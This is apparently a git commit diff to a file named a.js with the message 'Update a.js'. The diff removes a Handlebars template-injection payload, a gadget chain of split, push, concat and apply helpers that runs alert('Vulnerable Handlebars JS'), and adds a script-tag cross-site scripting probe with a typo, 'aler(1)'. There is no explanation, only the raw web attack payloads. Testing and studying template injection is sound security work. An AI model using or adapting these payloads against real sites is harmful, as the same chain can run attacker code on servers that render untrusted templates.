893d7e957cc36bed18cae317b09c75088b271342
Winsad <73716457+Wiinsad@users.noreply.github.com>
2024-11-21 03:21:06 -0600

    Update a.js

--- a.js
+++ a.js
@@ -1,11 +1,1 @@
-{{#with split as |a|}}
-        {{pop (push "alert('Vulnerable Handlebars JS');")}}
-        {{#with (concat (lookup join (slice 0 1)))}}
-            {{#each (slice 2 3)}}
-                {{#with (apply 0 a)}}
-                    {{.}}
-                {{/with}}
-            {{/each}}
-        {{/with}}
-    {{/with}}
-{{/with}}
+<script>aler(1)</script>
